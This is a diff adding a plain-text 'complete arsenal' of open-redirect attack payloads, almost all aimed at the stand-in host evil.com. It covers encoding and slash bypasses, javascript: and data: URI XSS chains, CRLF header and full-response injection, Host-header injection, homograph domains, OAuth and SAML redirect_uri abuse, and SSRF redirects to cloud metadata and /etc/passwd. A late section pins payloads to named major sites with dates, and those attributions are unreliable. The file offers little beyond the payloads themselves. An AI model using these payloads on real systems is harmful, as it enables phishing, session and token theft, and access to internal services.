@@ -1,0 +1,266 @@
+================================================================================
+OPEN REDIRECT PAYLOADS - COMPLETE ARSENAL
+================================================================================
+
+================================================================================
+BASIC OPEN REDIRECT PAYLOADS
+================================================================================
+
+https://evil.com – Absolute HTTPS redirect
+http://evil.com – Absolute HTTP redirect
+//evil.com – Protocol-relative redirect
+///evil.com – Triple slash redirect
+\\\\evil.com – Backslash redirect
+https://evil.com/ – Trailing slash
+http://evil.com/ – HTTP version
+//evil.com/ – Protocol-relative with slash
+/\/evil.com – Escaped slash
+https://evil.com@trusted.com – URL with user info
+https://trusted.com@evil.com – Reverse user info
+
+================================================================================
+URL PARSING BYPASS PAYLOADS
+================================================================================
+
+https://evil.com#trusted.com – Fragment bypass
+https://evil.com?trusted.com – Query parameter bypass
+https://evil.com&trusted.com – Amp bypass
+https://evil.com:80@trusted.com – Port injection
+https://evil.com:443@trusted.com – HTTPS port
+https://evil.com;trusted.com – Semicolon separator
+https://evil.com/../trusted – Path traversal with redirect
+https://evil.com/%2e%2e/trusted – Encoded traversal
+https://evil.com/..;/trusted – Semi-colon traversal
+https://evil.com/..\\trusted – Backslash traversal
+
+================================================================================
+DOUBLE / TRIPLE SLASH BYPASS PAYLOADS
+================================================================================
+
+//evil.com – Protocol-relative (works on most browsers)
+///evil.com – Triple slash
+////evil.com – Quadruple slash
+http:///evil.com – Malformed HTTP
+https:///evil.com – Malformed HTTPS
+http:////evil.com – Double double slash
+https://///evil.com – Triple HTTPS slash
+
+================================================================================
+BACKSLASH VARIANT PAYLOADS
+================================================================================
+
+\\evil.com – Windows share style
+\\\\evil.com – Quad backslash
+/\\evil.com – Mixed slashes
+https:\\evil.com – Mixed protocol slashes
+https://evil.com\\trusted.com – Mixed in path
+http:\\evil.com\@trusted.com – Mixed with user info
+
+================================================================================
+WHITESPACE / NULL BYTE BYPASS PAYLOADS
+================================================================================
+
+https://evil.com%00@trusted.com – Null byte injection
+https://evil.com%0d%0a@trusted.com – CRLF injection
+https://evil.com%20@trusted.com – Space injected
+https://evil.com%09@trusted.com – Tab injected
+ https://evil.com – Leading space
+https://evil.com  – Trailing space
+https://evil.com%0a@trusted.com – Line feed
+
+================================================================================
+ENCODING BYPASS PAYLOADS
+================================================================================
+
+https%3A%2F%2Fevil.com – URL encoded HTTPS
+http%3A%2F%2Fevil.com – URL encoded HTTP
+%2F%2Fevil.com – URL encoded protocol-relative
+https%3A%2F%2Fevil.com%40trusted.com – Encoded user info
+https://evil.com%2Ftrusted.com – Encoded slash
+%68%74%74%70%73%3A%2F%2Fevil.com – Full hex encoding
+https://evil.com/.%2e/trusted.com – Dot encoding
+
+================================================================================
+DOUBLE ENCODING PAYLOADS
+================================================================================
+
+https%253A%252F%252Fevil.com – Double encoded HTTPS
+%252F%252Fevil.com – Double encoded protocol-relative
+https%253A%252F%252Fevil.com%2540trusted.com – Double encoded user info
+%2568%2574%2574%2570%2573%253A%252F%252Fevil.com – Double hex encoded
+
+================================================================================
+JAVASCRIPT URI PAYLOADS (XSS Chain)
+================================================================================
+
+javascript:alert(1) – Basic JavaScript redirect
+javascript:alert(document.cookie) – Cookie alert
+javascript:window.location='https://evil.com' – JavaScript redirect
+javascript:document.location='https://evil.com' – Document location redirect
+javascript:top.location='https://evil.com' – Top location redirect
+JaVaScRiPt:alert(1) – Case obfuscation
+javascript:%61%6c%65%72%74(1) – URL encoded JavaScript
+javascript:alert`1` – Template literal
+javascript:alert(/1/) – Regex alert
+jAvAsCrIpT:alert(1) – Mixed case
+
+================================================================================
+DATA URI PAYLOADS (XSS Chain)
+================================================================================
+
+data:text/html,<script>alert(1)</script> – Data URI with HTML
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== – Base64 data URI
+data:text/html,<svg/onload=alert(1)> – SVG in data URI
+data:text/html,<body onload=alert(1)> – Body onload data URI
+data:text/html;charset=utf-8,<script>alert(1)</script> – Charset specified
+
+================================================================================
+DOMAIN WHITELIST BYPASS PAYLOADS
+================================================================================
+
+https://trusted.com.evil.com – Subdomain spoofing
+https://evil.com/trusted.com – Path spoofing
+https://trusted.com@evil.com – User info spoofing
+https://evil.com#trusted.com – Fragment spoofing
+https://trusted.com.evil.com/ – Dot in domain
+https://trusted。com – Unicode full stop (homograph)
+https://trusted.com. – Trailing dot
+https://trusted.com@evil.com:443 – Port preserved
+https://trusted.com.evil.com:8080 – Port with subdomain
+
+================================================================================
+HOMOGRAPH ATTACK PAYLOADS (IDN Spoofing)
+================================================================================
+
+https://truꜱted.com – Using Unicode homoglyphs
+https://аррӏе.com – Cyrillic homograph
+https://gооgle.com – Latin/Cyrillic mix
+https://раyраl.com – Homograph spoofing
+https://арple.com – Apple homograph
+
+================================================================================
+CRLF INJECTION REDIRECT PAYLOADS
+================================================================================
+
+/redirect?url=%0d%0aLocation:%20https://evil.com – CRLF to inject Location header
+/redirect?url=%0d%0aLocation:%20https://evil.com%0d%0a – CRLF with trailing
+/redirect?url=%0d%0aSet-Cookie:%20session=hijacked%0d%0a – Cookie injection
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Hacked</html> – Full HTTP response injection
+
+================================================================================
+META REFRESH REDIRECT PAYLOADS
+================================================================================
+
+<meta http-equiv="refresh" content="0;url=https://evil.com"> – Meta refresh injection
+<META HTTP-EQUIV="refresh" CONTENT="0;URL=https://evil.com"> – Uppercase meta
+<meta http-equiv='refresh' content='0; url=https://evil.com'> – Single quotes
+<meta http-equiv="refresh" content="5;url=https://evil.com"> – Delayed redirect
+
+================================================================================
+HTML INJECTION REDIRECT PAYLOADS
+================================================================================
+
+<script>window.location='https://evil.com'</script> – JavaScript redirect
+<script>location.href='https://evil.com'</script> – Location href
+<script>document.location='https://evil.com'</script> – Document location
+<script>window.location.href='https://evil.com'</script> – Full window location
+<script>top.location='https://evil.com'</script> – Top frame redirect
+<script>parent.location='https://evil.com'</script> – Parent frame redirect
+<script>self.location='https://evil.com'</script> – Self redirect
+
+================================================================================
+HEADER INJECTION REDIRECT PAYLOADS (Host/X-Forwarded-Host)
+================================================================================
+
+Host: evil.com – Host header injection
+X-Forwarded-Host: evil.com – X-Forwarded-Host injection
+X-Forwarded-For: evil.com – X-Forwarded-For injection
+X-Original-URL: https://evil.com – X-Original-URL injection
+X-Rewrite-URL: https://evil.com – X-Rewrite-URL injection
+X-HTTP-Method-Override: https://evil.com – Method override injection
+
+================================================================================
+REFERER BASED REDIRECT PAYLOADS
+================================================================================
+
+Referer: https://evil.com – Modified referer header
+Referer: https://evil.com/ – Trailing slash referer
+Referer: http://evil.com – HTTP referer
+Origin: https://evil.com – Origin header injection
+
+================================================================================
+PATH PARAMETER REDIRECT PAYLOADS
+================================================================================
+
+/redirect?next=https://evil.com – Next parameter
+/redirect?return_to=https://evil.com – Return_to parameter
+/redirect?continue=https://evil.com – Continue parameter
+/redirect?goto=https://evil.com – Goto parameter
+/redirect?dest=https://evil.com – Dest parameter
+/redirect?url=https://evil.com – URL parameter
+/redirect?path=https://evil.com – Path parameter
+/redirect?callback=https://evil.com – Callback parameter
+/redirect?redirect_uri=https://evil.com – Redirect_uri parameter
+/redirect?redirect_url=https://evil.com – Redirect_url parameter
+
+================================================================================
+VEHICLE FOR SSRF (Combined with Redirect)
+================================================================================
+
+https://evil.com/redirect?url=http://169.254.169.254/latest/meta-data/ – Redirect to metadata
+https://evil.com/redirect?url=http://localhost/admin – Redirect to internal admin
+https://evil.com/redirect?url=http://127.0.0.1:8080 – Redirect to internal service
+https://evil.com/redirect?url=file:///etc/passwd – Redirect to file (if allowed)
+
+================================================================================
+MAILTO / OTHER PROTOCOL PAYLOADS
+================================================================================
+
+mailto:attacker@evil.com – Email protocol redirect
+tel:+1234567890 – Telephone protocol
+sip:attacker@evil.com – SIP protocol
+ssh://evil.com – SSH protocol
+ftp://evil.com – FTP protocol
+smb://evil.com – SMB protocol
+view-source:https://evil.com – View source protocol
+
+================================================================================
+WELL-KNOWN OPEN REDIRECT VECTORS (OAuth/Callback)
+================================================================================
+
+/oauth/authorize?client_id=xxx&redirect_uri=https://evil.com – OAuth redirect
+/login?redirect_uri=https://evil.com – Login redirect
+/auth?callback=https://evil.com – Auth callback redirect
+/saml/login?RelayState=https://evil.com – SAML relay state
+/logout?return_to=https://evil.com – Logout redirect
+/register?next=https://evil.com – Registration redirect
+
+================================================================================
+REAL-WORLD OPEN REDIRECT NOTABLE PAYLOADS
+================================================================================
+
+https://accounts.google.com/Logout?continue=https://evil.com – Google logout redirect (2015)
+https://www.facebook.com/login.php?next=https://evil.com – Facebook login redirect (2016)
+https://twitter.com/logout?redirect_url=https://evil.com – Twitter logout redirect (2014)
+https://github.com/logout?return_to=https://evil.com – GitHub logout redirect (2017)
+https://linkedin.com/uas/logout?redirect=https://evil.com – LinkedIn redirect (2018)
+https://www.instagram.com/accounts/logout/?next=https://evil.com – Instagram redirect (2019)
+
+================================================================================
+REDIRECT RESPONSE INDICATORS (What to Look For)
+================================================================================
+
+302 Found – Temporary redirect
+301 Moved Permanently – Permanent redirect
+303 See Other – POST redirect
+307 Temporary Redirect – POST preserved
+308 Permanent Redirect – Permanent POST preserved
+Location: – Location header in response
+refresh: 0;url= – Meta refresh
+window.location – JavaScript redirect
+document.location – JS redirect
+top.location – Frame redirect
+
+================================================================================
+END OF OPEN REDIRECT PAYLOADS
+================================================================================
